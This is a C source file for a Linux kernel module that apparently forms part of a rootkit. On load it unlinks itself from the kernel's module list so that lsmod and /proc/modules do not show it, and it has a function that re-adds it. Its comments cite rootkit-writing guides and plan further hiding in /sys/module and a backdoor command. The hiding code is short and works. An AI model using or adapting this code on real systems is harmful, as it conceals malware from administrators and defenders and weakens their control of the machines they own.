#include <linux/module.h>   // For modules
#include <linux/kernel.h>   // For KERN_INFO
#include <linux/init.h>     // For init macros

#include "moduleHide.h"

// Credit goes to:
// http://www.infosecwriters.com/hhworld/hh9/lvtes.txt - explanation of concept
// http://alexids.googlecode.com/files/WRITING_A_SIMPLE_ROOTKIT_FOR_LINUX.pdf - code
// http://isis.poly.edu/kulesh/stuff/src/klist/ - kernel lists explained

static struct list_head *prev;	// The entry before our module in the kernel modules list


// Additional things to hide:
	// The file in the /sys/module/ folder
int __init moduleHide_init(void) {
	// Removes module structure from kernel module list structure, which in turn hides it from 
	// /proc/modules and lsmod.
	// While it is absent form the list, the module can't be uninstalled anymore.
	prev = THIS_MODULE->list.prev;
	list_del(&THIS_MODULE->list);

	return 0;
}

// Maybe change this into a close module command rather than a show module command?
// Or at least have the option - if we have the module hiding by default, there is no point
// in calling rmmod module.ko, this would require us to show it first. Might as well just
// have a direct backdoor command to kill the module.
// If we do this, then the below function (exit) can be called on that command instead.
void showModule(void) {
	list_add(&THIS_MODULE->list, prev);
}

// PREREQUISITE: showModule();
void __exit moduleHide_exit(void) {
}


